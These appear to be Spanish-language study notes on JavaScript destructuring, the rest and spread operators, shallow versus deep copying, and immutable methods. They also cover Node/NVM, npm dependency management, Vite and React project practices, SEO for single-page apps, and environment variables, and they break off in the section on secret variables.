La sintaxis utiliza corchetes en el lado izquierdo de la asignación para definir qué variables recibirán los valores del arreglo en el lado derecho

##### La asignación se realiza por posición (índice), no por nombre.

```
const colores = ["Rojo", "Verde", "Azul"];

// 1. Desestructuración básica por posición:
const [primerColor, segundoColor, tercerColor] = colores;

console.log(primerColor);   // "Rojo"
console.log(segundoColor);  // "Verde"
console.log(tercerColor);   // "Azul"
```

1. Asignación con Valores por Defecto

##### Asignar valores por defecto a las variables en caso de que el valor en esa posición del arreglo sea undefined o no exista.

```
const frutas = ["Manzana", "Naranja"];

// 'Uva' se usa como valor por defecto si no existe un tercer elemento
const [f1, f2, f3 = "Uva"] = frutas;

console.log(f3); // "Uva"
```


2. Ignorar Valores

Si solo necesitas algunos valores del arreglo y quieres omitir otros, puedes usar comas para saltar las posiciones.

```
const datos = [10, 20, 30, 40];

// Ignora 20 y 40
const [a, , c] = datos;

console.log(a); // 10
console.log(c); // 30
```


3. Operador Rest (...)

Recolectar todos los elementos restantes del arreglo en una nueva variable de tipo arreglo

Este operador siempre debe ser el último en la lista de desestructuración.

```
const lista = ["a", "b", "c", "d", "e"];

const [primero, segundo, ...resto] = lista;

console.log(primero); // "a"
console.log(resto);   // ["c", "d", "e"]
```


4. Intercambio de Variables

##### La desestructuración simplifica enormemente el proceso de intercambiar valores entre dos variables sin necesidad de una variable temporal. 

```
let x = 5;
let y = 10;

[x, y] = [y, x]; // ¡Intercambio en una sola línea!

console.log(x); // 10
console.log(y); // 5
```


5. Desestructuración en Retornos de Funciones

##### Es muy común que las funciones devuelvan un arreglo (por ejemplo, [valor, setter] en useState de React).

La desestructuración hace que el manejo de estos retornos sea muy limpio.

```
function usarConfig() {
  return [42, () => console.log("Configuración aplicada")];
}

// Desestructura directamente el valor de retorno:
const [id, aplicar] = usarConfig();

console.log(id); // 42
aplicar(); // "Configuración aplicada"
```


### Objetos

##### Permite desempaquetar propiedades de objetos en variables separadas con el mismo nombre que la propiedad, de forma concisa y legible.

##### Se asigna por nombre de propiedad, no por posición.

Utiliza llaves {} en el lado izquierdo de la asignación para listar las propiedades que quieres extraer del objeto en el lado derecho

```
const usuario = {
  nombre: "Alice",
  edad: 30,
  ciudad: "Madrid"
};

// 1. Desestructuración básica por nombre de propiedad:
const { nombre, edad } = usuario;

console.log(nombre); // "Alice"
console.log(edad);   // 30
// console.log(ciudad); // undefined (No fue desestructurada)
```


1. Renombrar Variables (Alias)

##### A veces, la variable que quieres crear debe tener un nombre diferente al de la propiedad del objeto

##### Puedes renombrar la variable usando dos puntos : durante la desestructuración.

```
const producto = { nombre: "Laptop", precio: 1200 };

// Extrae 'nombre' y asígnalo a una variable llamada 'nombreProducto'
const { nombre: nombreProducto, precio } = producto; 

console.log(nombreProducto); // "Laptop"
// console.log(nombre); // Error: nombre no está definido
```


2. Asignación con Valores por Defecto

Asignar valores por defecto en caso de que la propiedad no exista en el objeto (sea undefined).

```
const configuracion = { theme: "dark" };

// 'lenguaje' se usará si la propiedad no existe
const { theme, lenguaje = "es" } = configuracion;

console.log(theme);     // "dark"
console.log(lenguaje);  // "es"
```


3. El Operador Rest (...)

Se usa para recolectar todas las propiedades restantes del objeto en un nuevo objeto.

```
const datosUsuario = { id: 1, nombre: "Bob", edad: 40, email: "bob@mail.com" };

// Extrae 'nombre' y recoge el resto de propiedades en un nuevo objeto llamado 'restoDatos'
const { nombre, ...restoDatos } = datosUsuario; 

console.log(nombre);    // "Bob"
console.log(restoDatos); // { id: 1, edad: 40, email: "bob@mail.com" }
```


4. Desestructuración Anidada

##### Desestructurar propiedades de objetos que están anidados dentro del objeto principal.

```
const empresa = {
  nombre: "TechCorp",
  direccion: {
    ciudad: "NY",
    zip: "10001"
  }
};

// Extrae 'ciudad' del objeto anidado 'direccion'
const { direccion: { ciudad } } = empresa; 

console.log(ciudad); // "NY"
// console.log(direccion); // Error: el objeto 'direccion' no fue desestructurado, solo se usó para el path
```


5. Desestructuración en Argumentos de Funciones

Uno de los usos más comunes en React y en la programación funcional

Puedes desestructurar un objeto de props directamente en la definición de la función del componente.

```
// En React, el objeto 'props' se desestructura directamente:
function ComponenteUsuario({ nombre, email }) {
  // Ahora usas 'nombre' y 'email' directamente, sin usar props.nombre
  return <h1>Usuario: {nombre}, Email: {email}</h1>; 
}
```


## Rest y Spread Operator

### Rest

##### Permite recolectar elementos o propiedades restantes de una estructura (como un arreglo o un objeto) y agruparlos en una única nueva variable.

"Rest" proviene de que recolecta el resto de los elementos no asignados.


1. En desestructuración de arrays

##### Recolecta todos los elementos restantes del arreglo que no han sido desestructurados y los coloca en un nuevo arreglo

```
const numeros = [1, 2, 3, 4, 5];

// 'primero' toma el 1, 'segundo' toma el 2.
// 'resto' recolecta el 3, 4 y 5 en un nuevo arreglo.
const [primero, segundo, ...resto] = numeros; 

console.log(primero); // 1
console.log(resto);   // [3, 4, 5]
```

##### El operador Rest ... siempre debe ser el último elemento en la desestructuración de arreglos, ya que recolecta todo lo demás.


2. En la desestructuración de Objetos

Recolecta todas las propiedades restantes de un objeto que no han sido desestructuradas y las agrupa en un nuevo objeto.

```
const usuario = { nombre: "Alice", edad: 30, ciudad: "NY", pais: "USA" };

// 'nombre' toma "Alice", el resto de propiedades se agrupan en 'otrosDatos'.
const { nombre, ...otrosDatos } = usuario; 

console.log(nombre);     // "Alice"
console.log(otrosDatos); // { edad: 30, ciudad: "NY", pais: "USA" }
```


3. En definición de funciones (Rest Params)

##### Permite que una función acepte un número indefinido de argumentos como un arreglo.

Útil cuando no sabes cuántos argumentos recibirá tu función

```
function sumarTodos(a, b, ...losDemas) {
  let suma = a + b;
  // 'losDemas' es un arreglo, por lo que podemos usar métodos de arreglo como 'forEach' o 'reduce'.
  losDemas.forEach(num => {
    suma += num;
  });
  return suma;
}

// 10 y 20 son 'a' y 'b'. El resto (30, 40, 50) es 'losDemas'.
console.log(sumarTodos(10, 20, 30, 40, 50)); // Resultado: 150
```

##### El operador Rest ... debe ser el último parámetro listado en la definición de la función.


### Rest vs Spread 

Utilizan la misma sintaxis (...)

Rest:
Recolectar/Empaquetar (Agrupa múltiples elementos en un solo arreglo/objeto).
Ubicación: En el lado izquierdo de la asignación (desestructuración) o como el último parámetro de una función.

Spread:
Expandir/Desempaquetar (Descompone un arreglo/objeto en elementos individuales).
Ubicación: En el lado derecho de la asignación (cuando se define un nuevo arreglo u objeto) o como argumento al llamar a una función

```
const arr1 = [1, 2];
const arr2 = [3, 4];

// Spread: Expande los elementos de arr1 y arr2 en un nuevo arreglo.
const nuevoArreglo = [...arr1, ...arr2]; // [1, 2, 3, 4]
```



### Spread

##### Expandir un elemento iterable (como un arreglo o una string) en sus componentes individuales.

##### Desempaqueta elementos en lugares donde se esperan elementos individuales

1. Copiar y Clonar Arreglos u Objetos

##### Forma más moderna y común de crear una copia superficial de un arreglo o un objeto, garantizando la inmutabilidad.

Array: Desempaqueta el arreglo en una nueva lista de elementos.

```
const original = [1, 2, 3];
const copia = [...original]; // Crea [1, 2, 3]

console.log(copia === original); // false (Son referencias de memoria diferentes)
```


Objetos: Desempaqueta las propiedades del objeto en un nuevo objeto

Es vital en React para actualizar el estado de manera inmutable.

```
const usuario = { nombre: "Leo", edad: 25 };
const nuevoUsuario = { ...usuario, edad: 26 }; // Copia y sobrescribe 'edad'

console.log(nuevoUsuario); // { nombre: "Leo", edad: 26 }
console.log(usuario);     // { nombre: "Leo", edad: 25 } (Original no mutado)
```


2. Combinar Arreglos u Objetos

##### Simplifica la concatenación de arreglos o la fusión de objetos sin usar métodos mutables como push o concat.

Combinar arrays

```
const a = [1, 2];
const b = [3, 4];
const combinado = [...a, ...b, 5];

console.log(combinado); // [1, 2, 3, 4, 5]
```

Combinar Objetos:

```
const configDefecto = { theme: 'light', idioma: 'es' };
const configUsuario = { idioma: 'en', notificaciones: true };
// El objeto a la derecha sobrescribe propiedades con el mismo nombre.
const final = { ...configDefecto, ...configUsuario }; 

console.log(final); 
// { theme: 'light', idioma: 'en', notificaciones: true }
```


3. Pasar Argumentos a Funciones

##### Spread permite pasar los elementos de un arreglo como argumentos individuales a una función

##### Útil para funciones que esperan múltiples parámetros fijos.

```
function sumar(a, b, c) {
  return a + b + c;
}

const numeros = [10, 20, 30];

// Expande [10, 20, 30] en tres argumentos separados: sumar(10, 20, 30)
console.log(sumar(...numeros)); // 60
```


4. Convertir Iterables a Arreglos

##### Convertir cualquier objeto iterable (como una string o un NodeList del DOM) en un arreglo.

```
const nombre = "React";

// Expande "R", "e", "a", "c", "t" en un nuevo arreglo.
const letras = [...nombre]; 

console.log(letras); // ["R", "e", "a", "c", "t"]
```


Vs Rest

Spread (...): Expande/Desempaqueta elementos de una fuente. 
(Se usa en el lado derecho de una asignación o al llamar una función).

Rest (...): Recolecta/Empaqueta elementos restantes en un arreglo u objeto. 
(Se usa en el lado izquierdo de una asignación o en la definición de parámetros de una función).



### Copia Superficial vs Copia Profunda: inmutabilidad

#### Superficial en arrays y objetos

Duplica una estructura de datos (arreglo u objeto) que contiene otras estructuras anidadas.

crea un nuevo arreglo u objeto de nivel superior

##### Pero los elementos o propiedades anidadas (objetos o arreglos internos) siguen referenciando los mismos objetos que la fuente original

Ej: array de dos niveles

```
const original = [1, { id: 100, valor: 'A' }, 3];
//                     ^ Propiedad Anidada (Objeto)
```


Cuando creas una copia superficial de original:

1. Se crea un nuevo arreglo llamado copia.

2. El elemento 1 y el 3 (que son primitivos) se copian por valor.

3. El objeto { id: 100, valor: 'A' } (la propiedad anidada) no se duplica. En su lugar, el nuevo arreglo copia almacena una referencia (un puntero) al mismo objeto anidado que está en el arreglo original.

##### Efecto: Si modificas el objeto anidado en la copia, también lo modificas en el original, porque ambos apuntan al mismo lugar en la memoria    


Métodos para hacer copias superficiales

1. arrays: Spread Operator (...)
Es el método más moderno
Desempaqueta todos los elementos del arreglo original en un nuevo arreglo

```
const copia = [...original];
```

2. Array.prototype.slice():
Devuelve una porción del arreglo
Usado sin argumentos, devuelve una copia superficial de todo el arreglo.

```
const copia = original.slice();
```

3. Array.from():
Crea una instancia de Array a partir de un iterable.

```
const copia = Array.from(original);
```


Objetos: 

1. Spread Operator (...)
Forma preferida
Desempaqueta todas las propiedades enumerables del objeto original en un nuevo objeto.

```
const copia = { ...original };
```

2. Object.assign()
Fusiona las propiedades de uno o más objetos fuente en un objeto destino
Usando un objeto vacío ({}) como destino, se crea la copia.

```
const copia = Object.assign({}, original);
```


Ej: Riesgo de Mutación

##### La copia superficial no es segura para datos anidados y por qué es crucial en React.

```
const productos = [
  { id: 1, nombre: 'Laptop' },
  { id: 2, nombre: 'Monitor' } // <--- Objeto Anidado
];

// 1. Crear una Copia Superficial (Método recomendado)
const copiaProductos = [...productos]; 

// Verificar que los arreglos son diferentes:
console.log(productos === copiaProductos); // false (OK, son arreglos diferentes)

// 2. Modificar el Objeto Anidado en la Copia:
copiaProductos[1].nombre = 'Monitor 4K'; // ¡Mutación del objeto anidado!

// 3. Resultado: ¡El original también fue modificado!
console.log(productos[1].nombre); // "Monitor 4K" 
// Esto sucede porque copiaProductos[1] y productos[1] apuntan a la misma dirección de memoria.
```

##### La copia superficial solo garantiza la inmutabilidad del nivel superior

##### Si necesitas modificar una propiedad anidada sin afectar al original, debes realizar una Copia Profunda (Deep Copy) de esa parte del objeto o de toda la estructura.



#### Profunda en arrays y objetos

##### Duplicar un arreglo o un objeto de modo que todos los niveles de la estructura de datos (incluidos los objetos y arreglos anidados) sean nuevos y apunten a diferentes ubicaciones de memoria.

Esto es la única manera de garantizar la inmutabilidad total, ya que modificar el objeto anidado en la copia no afectará al objeto original.

1. Crea un nuevo contenedor (arreglo u objeto).

2. Itera a través de cada propiedad o elemento.

3. Si la propiedad es un valor primitivo (string, number, boolean, null, undefined), lo copia por valor.

4. Si la propiedad es un objeto o arreglo anidado, aplica el proceso de copia profunda recursivamente a ese objeto anidado.

El resultado es una estructura completamente nueva e independiente de la fuente.


JavaScript moderno no tiene un método nativo y universalmente seguro para la copia profunda (a diferencia de la copia superficial)

Debes usar técnicas o librerías específicas.


1. JSON.parse(JSON.stringify())

Método más común y rápido, pero tiene limitaciones importantes

```
const original = { id: 1, fecha: new Date(), datos: [1, 2] };

// 1. Convertir a String (serialización)
// 2. Volver a convertir a Objeto (deserialización)
const copiaProfunda = JSON.parse(JSON.stringify(original));
```

Limitaciones:

##### Funciones: Las funciones dentro del objeto se pierden.

Fechas: Los objetos Date se convierten en strings y pierden su tipo original.

RegExp: Las expresiones regulares se convierten en objetos vacíos.

undefined: Las propiedades con valor undefined se pierden.

Objetos Complejos: Objetos con referencias circulares (donde A apunta a B y B apunta a A) causarán un error.


2. Uso de structuredClone() (Moderno y Seguro)

Es una API global introducida en JavaScript (soporte moderno en navegadores y Node.js 16+).

Está diseñado específicamente para crear copias profundas de manera segura y eficiente.

```
const original = { id: 1, fecha: new Date(), datos: [1, 2] };

// Copia profunda segura de objetos complejos y tipos de datos modernos.
const copiaProfunda = structuredClone(original);
```

##### Maneja Mapas, Sets, Date, RegExp y ArrayBuffer correctamente.

Maneja referencias circulares sin fallar.

Es la mejor opción nativa para el 99% de los casos de uso


3. Librerías (Máxima Compatibilidad)

##### Para entornos legacy o cuando se requiere una funcionalidad de copia profunda muy sofisticada, las librerías especializadas siguen siendo la mejor opción

Lodash: Usa la función `_.cloneDeep(value)`.

Es robusta, maneja la mayoría de los casos de borde y es compatible con entornos más antiguos


En React

La copia profunda es crucial:

1. Estado Anidado: Necesitas actualizar una propiedad dentro de un objeto anidado en tu estado (ej., un campo de un formulario anidado).

2. useReducer Complejo: El estado manejado por un reducer es una estructura de datos profunda.

##### Intentar modificar una propiedad anidada después de una copia superficial causará un error lógico

##### React no detectará que el objeto anidado ha cambiado, y el componente no se volverá a renderizar con el valor correcto.



## Métodos, props y funciones inmutables


### Para Arrays

1. Creación y Transformación

Devuelven un nuevo arreglo que contiene los resultados de la operación, dejando el arreglo fuente intacto.

map():
Crea un nuevo arreglo aplicando una función (callback) a cada elemento del arreglo original
El nuevo arreglo siempre tiene la misma longitud.
Transformar o modificar cada elemento individualmente.

filter():
Crea un nuevo arreglo con todos los elementos que cumplen la condición de la función (callback),
que devuelven true.
Seleccionar un subconjunto de elementos.

slice():
Devuelve una copia superficial de una porción del arreglo original en un nuevo arreglo
Si se usa sin argumentos (arr.slice()), crea una copia completa.
Clonar un arreglo o extraer un rango

concat():
Devuelve un nuevo arreglo que contiene los elementos del arreglo original más los elementos o arreglos que se le pasen como argumentos.
Combinar dos o más arreglos.

spread operator (...):
El operador Spread expande el arreglo original en sus elementos individuales
que luego pueden ser usados para construir un nuevo arreglo de forma inmutable.
Clonar, combinar o añadir elementos a un arreglo.


2. Métodos de Búsqueda y Reducción (Devuelven un Valor Único)

Procesan el arreglo para devolver un valor único o un subconjunto, sin modificar la fuente.

find(): 
Devuelve el primer elemento del arreglo que cumple con la condición de la función callback.
Devuelve undefined si no encuentra ninguno.
Encontrar un elemento específico.

findIndex():
Devuelve el índice del primer elemento que cumple con la condición
Devuelve -1 si no lo encuentra.
Encontrar la posición de un elemento.

reduce():
Ejecuta una función sobre todos los elementos del arreglo (de izquierda a derecha) para devolver un único valor acumulado.
Calcular una suma, un promedio, o transformar el arreglo a un objeto

includes():
Devuelve un booleano (true o false) indicando si el arreglo contiene un valor específico.
Verificar la existencia de un valor.

indexOf():
Devuelve el primer índice en el que se puede encontrar un elemento dado.
Devuelve -1 si no está presente.
Obtener la posición de un valor conocido.

every():
Devuelve un booleano (true) si todos los elementos en el arreglo cumplen con la condición de la función callback.
Validar si una condición se cumple universalmente.

some():
Devuelve un booleano (true) si al menos un elemento en el arreglo cumple con la condición de la función callback.
Verificar la existencia de al menos un elemento que cumpla una condición.


3. Propiedad de Acceso

length	
Devuelve la cantidad de elementos en el arreglo. 
No modifica el contenido
Conocer el tamaño del arreglo o iterar sobre él.


### Para Objetos

1. Métodos de Creación y Clonación (Devuelven un Nuevo Objeto)

Forma estándar de obtener una copia del objeto original y aplicar cambios en esa copia.

Object.assign():
Crea un nuevo objeto fusionando las propiedades de uno o más objetos fuente en un objeto destino
Para la inmutabilidad, el primer argumento debe ser un objeto vacío ({}).
Clonar un objeto o fusionar varios objetos en uno solo

spread operator (...):
expande las propiedades del objeto original en un nuevo objeto, permitiendo añadir o sobrescribir propiedades de forma concisa.
La forma más común y legible de clonar y actualizar el estado de un objeto en React.


2. Métodos de Acceso, Iteración y Conversión (Devuelven un Valor Diferente)

Solo leen la información del objeto o la transforman en otro tipo de estructura de datos (como un arreglo), sin alterar el objeto fuente.

Object.keys():
Devuelve un nuevo arreglo que contiene los nombres de las propiedades (claves) enumerables de un objeto.
Iterar sobre las claves del objeto.

Object.values():
Devuelve un nuevo arreglo que contiene los valores de las propiedades enumerables de un objeto.
Obtener todos los valores para procesarlos (ej., calcular una suma).

Object.entries():
Devuelve un nuevo arreglo de arreglos
donde cada arreglo interno contiene el par clave, valor 
de las propiedades enumerables del objeto.
Iterar sobre las propiedades y valores simultáneamente.

hasOwnProperty():
Devuelve un booleano (true o false)
indicando si el objeto posee la propiedad especificada directamente
(sin contar la cadena de prototipos).
Verificar la existencia segura de una propiedad

JSON.parse(JSON.stringify(obj)):
Función de utilidad: Convierte el objeto a una cadena JSON
y luego lo vuelve a convertir a un objeto
Crea una copia profunda (funciona solo con datos serializables).
Clonación profunda de objetos simples
(sin funciones o fechas).


3. Propiedad de Acceso

(Notación de corchetes):
Accede al valor de una propiedad del objeto. 
No lo modifica.
Obtener el valor de una propiedad dinámica o que contiene espacios.

(Notación de punto)
Accede al valor de una propiedad del objeto
No lo modifica.
Obtener el valor de una propiedad conocida estáticamente

En JS nativo, la única forma directa de mutar un objeto es mediante la asignación directa (obj.propiedad = nuevoValor) o usando el método delete para eliminar una propiedad
Estos métodos ayudan a evitar esas mutaciones



# Proyecto

Entornos, dependencias, paquetes, etc 

Gestión de las versiones de Node.js, npm y las dependencias locales


## Node y NVM

Entorno de ejecución de JavaScript en el servidor (o máquina). Actualizarlo tiene el mayor impacto a nivel de sistema.

Un Gestor de Versiones de Node (NVM) permite tener múltiples versiones de Node instaladas y cambiar entre ellas por proyecto o sesión.

1. Instalar NVM

2. Instalar última versión LTS: nvm install --lts

3. Usar la versión: `nvm use [versión]` (ej: nvm use 20.10.0)


Comandos de NVM:

`nvm install 20`	Instala la última versión principal 20.
`nvm use 20.10.0`	Cambia a la versión 20.10.0 en la sesión actual.
`nvm ls`	Lista todas las versiones de Node instaladas.
`nvm alias default 20`	Establece la versión 20 como la predeterminada al iniciar la terminal.
`nvm install --lts`	Instala la versión de Soporte a Largo Plazo (LTS) más reciente.
`nvm use default`	Vuelve a la versión predeterminada.


Ventajas: 

Características Modernas:
Acceso a las últimas características de JavaScript (ESNext) sin necesidad de Babel, ya que el motor V8 de Node está actualizado

Seguridad:
Las versiones LTS (Long-Term Support) más recientes incluyen parches críticos para vulnerabilidades de seguridad.
Es el principal motivo para actualizar.

Compatibilidad de Módulos:
Algunos módulos binarios (N-API) o herramientas globales pueden requerir una versión específica de Node para compilarse o funcionar correctamente

##### La versión que configures afectará a todos los proyectos que no usen un .nvmrc o gestor local.



## Paquetes (Dependencias Locales)

Los paquetes locales son las librerías específicas de tu proyecto, listadas en package.json (ej: React, Express, Webpack).

1. Auditoría de Vulnerabilidades
`npm audit` (Identifica vulnerabilidades de seguridad conocidas).

2. Usar herramientas como `npm-check-updates` (ncu) o el modo interactivo de npm para ver qué versión mayor o menor está disponible. 

3. Actualizar Paquetes Específicos:
`npm install [paquete]@[versión]` (Para una actualización controlada).

4. Actualizar Todos (con riesgo):
`npm update` (Solo actualiza a la versión menor o parche dentro del rango especificado en package.json).


Implicaciones: 

Rendimiento y Funcionalidad:
Acceso a optimizaciones, nuevas características y correcciones de bugs de las librerías que utilizas
(ej. mejor rendimiento de React, nuevas funciones de Express).

Ruptura (Breaking Changes):
Mayor riesgo
##### Las actualizaciones de versión mayor (ej: v1.x a v2.x) pueden incluir cambios que rompen la compatibilidad y requieren refactorizar tu código.

Seguridad Local:
Soluciona vulnerabilidades conocidas en paquetes de terceros que podrían ser explotadas en tu aplicación o durante el proceso de build.

Tamaño de Bundle:
Algunas librerías reducen su tamaño en versiones más nuevas, lo que puede resultar en un bundle de producción más ligero.


SemVer y Riesgo:

Cuando actualizas dependencias locales, el Versionado Semántico (SemVer) guía el riesgo:

1. Parche (.0.0): Correcciones de bugs. Riesgo muy bajo. (Ej: 1.0.4 a 1.0.5)

2. Menor (0.0): Nuevas características compatibles con versiones anteriores. Riesgo bajo a medio. (Ej: 1.4.0 a 1.5.0)

3. Mayor (0.0.0): Incompatibilidad
Contiene breaking changes
Riesgo alto. 
(Ej: 1.5.0 a 2.0.0)

##### Siempre revisa el changelog de las librerías cuando actualices una versión mayor.



## Vite

### TS config

1. tsconfig.json tenga reglas estrictas (strict: true) para capturar errores temprano.


2. Instalar dependencias de desarrollo


3. Variables de entoro: 

Usa .env con el Prefijo VITE_:

Vite solo expone las variables de entorno al código fuente si comienzan con VITE_ (ej., VITE_API_URL).


4. Separación: Usa .env.development para tu API local

.env.production para la URL de la API desplegada

Facilita cambiar de entorno rápidamente.


5. Memorización de Referencias:

Estabilidad de Props: Utiliza useCallback para estabilizar las funciones que pasas como props
useMemo para estabilizar objetos o arreglos que pasas a componentes memoizados.

Dependencias Limpias: Asegúrate de que los arreglos de dependencias (useEffect, useMemo, useCallback) sean correctos para que la lógica se ejecute solo cuando sea necesario, y no en cada renderizado


6. Carga Diferida (Lazy Loading):

Rutas Dinámicas: Usa la combinación de React.lazy()

Suspense en tus archivos de rutas (/pages).    

Esto divide el código (code splitting) por página, reduciendo el tamaño del bundle inicial y mejorando la velocidad de carga percibida.


7. Fragmentos Cortos

Evita div Innecesarios: Prioriza el uso de la sintaxis corta de Fragmentos (<>...</>) en lugar de <div> cuando solo necesitas agrupar elementos sin añadir un nodo extra al DOM

Esto mantiene el árbol DOM más ligero y mejora ligeramente el rendimiento.


8. Importaciones Absolutas

Simplifica las Rutas:

Configura alias de rutas en el archivo vite.config.js

tsconfig.json para evitar la navegación con rutas relativas largas

(ej., ../../../components/ui).

Ej: Configura @/ para que apunte a /src.

Luego puedes importar usando import Boton from '@/components/ui/Boton'.


9. Estado Global y Contexto

##### Modulariza el Estado Global

Si usas una librería como Redux (o el Context API)

divide tu store o context en módulos pequeños (slices/features).

garantiza que las actualizaciones de una parte del estado (ej., el tema)

no fuerzen re-renderizados innecesarios en componentes que solo usan otra parte (ej., la autenticación).


10. Custom Hooks para el Contexto:

##### Siempre crea un Custom Hook (ej., useAuth) para consumir un Context

Esto no solo limpia el código en el componente, sino que te permite añadir lógica de validación

(por ejemplo, verificar si el hook se llama fuera de su Provider)

garantiza que las funciones devueltas sean estables con useCallback.


11. Separación Rigurosa

##### Asegúrate de que solo los Componentes Contenedor (los que están en /features) se conecten a la API o al store global

Los Componentes Presentacionales (en /components/ui) solo deben recibir datos a través de props.


12. Despliegue y CI/CD

Previsualización Local del Build:

Verifica la Producción: Antes de hacer deploy, siempre ejecuta una versión compilada y optimizada de tu aplicación localmente

##### Para verificar que el code splitting y las variables de entorno de producción funcionen correctamente.

```
npm run build # Genera la carpeta /dist
npm install -g serve # Instala un servidor simple
serve -s dist       # Sirve la carpeta /dist
```

Automatización y CI/CD:

Gatilla el Build en el main: Configura tu pipeline de CI/CD (GitHub Actions, GitLab CI, etc.) para que automáticamente ejecute los tests y el build (npm run build) cada vez que se fusione código a la rama principal (main).

Esto asegura que el despliegue siempre provenga de un artefacto probado


Estrategia de Caching:

Cache-Busting: Vite maneja automáticamente el cache-busting al añadir hashes a los nombres de los archivos (app.a1b2c3d4.js).

Esto asegura que los usuarios siempre descarguen las últimas versiones de los archivos JS/CSS después de un nuevo despliegue.


13. Accesibilidad (A11y) y SEO

Etiquetas Semánticas:

Prioriza HTML Nativo: Utiliza elementos HTML semánticos (<header>, <nav>, <main>, <footer>) en lugar de depender únicamente de <div> con clases. 

Esto ayuda a los screen readers y mejora el SEO.


Etiquetas Alt en Imágenes:

Nunca Olvides el alt: Asegúrate de que todos los componentes de imagen tengan una prop alt con una descripción significativa para cumplir con los estándares de accesibilidad.


Gestión de Metadatos:

Control del document.title: Utiliza librerías como react-helmet-async para gestionar dinámicamente el título de la página (document.title) y otras etiquetas meta dentro del componente de cada página

Esto es crucial para el SEO.


## SEO

Mientras que el contenido y los backlinks son clave, la forma en que React construye y sirve la aplicación es fundamental para que los crawlers (rastreadores) de Google puedan indexarla correctamente


React y SPAs:

El mayor desafío del SEO en React es que, por defecto, se construye como una SPA

Donde el HTML inicial está casi vacío y el contenido se carga dinámicamente con JavaScript

Los crawlers antiguos podían tener problemas al indexar este contenido.


1. Servir Contenido Renderizado Previamente

Asegura que el crawler vea el contenido final de la página inmediatamente.


SSR (Server-Side Rendering): El servidor (Node.js) renderiza la página completa a HTML en cada solicitud:

Es la mejor opción para contenido que cambia frecuentemente y que debe tener la información más actual

Next.js y Remix son frameworks que hacen esto por defecto.


SSG (Static Site Generation): El HTML se genera por adelantado en el momento del build (ej., páginas de landing o documentación).

Es extremadamente rápido para el SEO

Gatsby y Next.js también lo soportan


Prerendering: Se usa un servicio para pre-renderizar las rutas clave en HTML estático que se sirve a los crawlers.


2. Gestión de Metadatos Dinámicos

Los metatags (<title>, <meta name="description">) son vitales para el SEO y deben ser específicos para cada ruta.

Librerías de Helmet: Utiliza librerías como react-helmet-async (o componentes de Next.js como <Head>) 

para inyectar dinámicamente las etiquetas <title>, <meta name="description">, y etiquetas Open Graph (og:title, etc.) en el <head> del documento

basadas en la ruta actual o en los datos de la página.

Buena Práctica: Cada componente de página debe definir sus propios metatags.


3. URL Limpias y Semánticas

Routing Basado en el Historial: Asegúrate de que tu enrutamiento (routing) utilice el API de Historial de HTML5

(por defecto en react-router-dom

para crear URLs legibles y semánticas

(ej., /productos/laptop-gamer)

en lugar de URLs con hash (ej., /#/productos/laptop-gamer).


URLs Descriptivas: La estructura de la URL debe reflejar la jerarquía del sitio.


Contenido y Experiencia de Usuario (UX):

Imágenes Optimizadas y Accesibles
Compresión y Formatos Modernos: Usa formatos de imagen modernos (WebP o AVIF) y comprime las imágenes para reducir el tamaño de descarga. Vite facilita el procesamiento de imágenes.
Etiquetas alt: Como mencionamos antes, cada imagen no decorativa debe tener un atributo alt descriptivo. Esto no solo ayuda a la accesibilidad, sino que también permite a los crawlers entender el contenido de la imagen.
Lazy Loading Nativo: Implementa la carga diferida (lazy loading) para imágenes que están debajo del pliegue (fuera de la vista inicial) usando el atributo nativo loading="lazy    

Rendimiento de Carga (Core Web Vitals)
Google usa las métricas de Core Web Vitals (Métricas Web Esenciales) para evaluar la experiencia de la página. Mejorar estas métricas impulsa el SEO.

LCP (Largest Contentful Paint): El tiempo que tarda en cargarse el elemento de contenido más grande
SSR/SSG y la optimización de imágenes son cruciales aquí.

FID (First Input Delay) / INP (Interaction to Next Paint): Mide la interactividad.
La carga diferida (lazy loading) de código JS con React.lazy() y Suspense es vital para reducir la cantidad de JS que el navegador tiene que procesar al inicio.

CLS (Cumulative Layout Shift): Mide la estabilidad visual.
Evita el movimiento inesperado del contenido después de la carga inicial
(por ejemplo, reservando espacio con CSS para imágenes o anuncios que se cargan tarde).


Datos Estructurados (Schema Markup)

Microdatos JSON-LD: Implementa datos estructurados usando el formato JSON-LD para que Google entienda el contenido de la página y muestre rich results (resultados enriquecidos) en la SERP (página de resultados de búsqueda).
Casos de Uso: Valoraciones de productos (Product), recetas (Recipe), información de contacto de la empresa (Organization), o preguntas frecuentes (FAQPage).


Avanzadas y Mantenimiento

Enrutamiento del lado del Servidor y Cliente

Sitemaps Dinámicos: Si tu contenido cambia frecuentemente, genera un sitemap.xml
dinámicamente en el servidor para que los crawlers conozcan todas las URL relevantes de tu sitio.    
    
Archivos robots.txt: Usa este archivo para indicar a los crawlers qué partes del sitio no deben rastrear (ej., rutas de administración o datos de usuario privados).


Manejo de Errores y Redirecciones

Páginas 404 Útiles: Crea una página 404 amigable en React que proporcione enlaces útiles a otras partes del sitio

Redirecciones 301: Implementa redirecciones 301 (permanentes) a nivel de servidor o build (si usas Next.js) para cualquier URL antigua que haya cambiado.

Nunca dependas de redirecciones hechas puramente con JavaScript después de que la página se carga.



## Env

Las Variables de Entorno son valores dinámicos que afectan la forma en que los procesos en ejecución (programas, scripts o aplicaciones) se comportan en una computadora.

Interruptores globales o configuraciones externas que el programa lee al iniciarse para determinar dónde debe conectarse

Qué nivel de registro debe usar o qué claves de acceso necesita.


##### Es simplemente un par clave-valor definido fuera del código fuente de una aplicación.

##### El entorno de ejecución (el sistema operativo, el shell, o el entorno de runtime como Node.js) hace que esta información esté disponible para la aplicación.

Clave: El nombre de la variable (ej., NODE_ENV, DATABASE_URL).

Valor: El dato asociado a la clave (ej., production, postgresql://user:pass@host/db).


##### Las variables de entorno son la mejor práctica para evitar el Hardcoding

de valores de configuración que cambian entre los distintos entornos de despliegue.

Entorno | Valor de la Variable API_URL

Desarrollo	http://localhost:8080/api
Staging	https://api.staging.miempresa.com
Producción	https://api.miempresa.com

Si la URL de la API estuviera codificada en el código fuente, tendrías que modificar el código y recompilarlo cada vez que cambies de entorno

##### Con variables de entorno, solo cambias el archivo de configuración externa (.env o la configuración del servidor).


#### Usos y Tipos de Variables

Se agrupan en dos categorías principales según su sensibilidad:

1. Variables de Configuración (No Sensibles)

Se usan para ajustar el comportamiento de la aplicación en un entorno específico.

Modo de Ejecución: NODE_ENV (development, production).

Rutas de API: API_URL, WEBSOCKET_URL.

Puertos: PORT (el puerto en el que escucha un servidor


2. Variables Sensibles (Secretos)

Contienen información confidencial que nunca debe ser subida a repositorios públicos de código (Git).

